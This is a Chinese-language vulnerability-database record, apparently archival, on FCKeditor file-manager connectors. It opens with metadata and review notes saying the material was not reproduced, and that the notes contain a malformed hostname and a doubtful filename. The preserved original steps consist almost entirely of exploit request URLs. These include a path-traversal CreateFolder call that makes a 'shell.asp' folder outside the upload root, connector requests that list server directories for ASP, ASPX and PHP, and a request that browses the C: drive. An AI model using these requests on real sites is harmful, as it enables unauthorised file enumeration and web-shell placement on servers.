---
source: "hatch 补库批 20260928"
product: "FCKeditor connectors"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "四、FCKeditor 列目录"
prerequisites: "来源所述条件，未列明部分仍待核：Absent; Windows drive path and enabled connector assumed"
side_effects: "未执行；本文需注意的操作影响：Directory-view step sends mutating CreateFolder; must label side effect"
source_status: "unknown"
id: "vw-eb4201ed3dab29fc348d7108"
entity_id: "ve-eb4201ed3dab29fc348d7108"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Absent; Windows drive path and enabled connector assumed

代码与实验材料：GetFoldersAndFiles and CreateFolder requests; no output/auth comparison

来源证据范围：Import only

- **操作与副作用边界（1）**：Directory-view step sends mutating CreateFolder; must label side effect。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **代码与转录边界（2）**：No access-control proof/version, malformed sample hostname and questionable fckeditor.html filename。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 1、FCKeditor/editor/fckeditor.html

FCKeditor/editor/fckeditor.html不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页，可以查看已经上传的文件。

2、根据xml返回信息查看网站目录
==============================

    http://www.-sec.org/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../../&NewFolderName=shell.asp

3、获取当前文件夹
=================

    FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
    FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
    FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/

4、游览c盘
==========

    /FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=c:/
